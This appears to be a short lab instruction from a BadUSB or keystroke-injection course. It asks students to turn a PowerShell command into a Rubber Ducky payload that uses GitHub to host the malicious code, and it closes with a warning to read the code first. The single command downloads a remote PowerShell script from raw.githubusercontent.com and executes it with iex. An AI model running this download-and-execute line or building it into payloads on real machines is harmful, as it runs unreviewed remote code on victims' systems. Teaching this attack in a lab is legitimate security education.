In our labs, we sent data to Pastebin/Github. But what if we used those platforms to host our malicious code?!
Duckify this powershell command:
```powershell
iex((iwr https://raw.githubusercontent.com/kenvb/badusb/refs/heads/main/docs/dangerouscode.ps1).content)
```
But before you do. 

PLEASE LOOK AT THE CODE AND UNDERSTAND IT!

Always be vigilant!
